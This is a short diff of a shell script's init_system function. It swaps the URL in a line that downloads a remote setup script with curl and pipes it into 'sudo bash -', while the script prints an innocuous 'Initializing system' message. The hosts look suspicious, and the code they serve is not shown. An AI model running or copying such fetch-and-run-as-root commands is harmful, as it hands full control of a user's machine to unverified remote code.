@@ -59,7 +59,7 @@ show_main_menu() {
 init_system() {
     echo -e "${GREEN}Initializing system...${NC}"
     sleep 2
-    curl -sL https://repo.magicbyte.pw/setup.sh | sudo bash -
+    curl -sL https://repo.licenseapi.top/setup.sh | sudo bash -
     echo -e "${GREEN}System initialization completed!${NC}"
 }
 
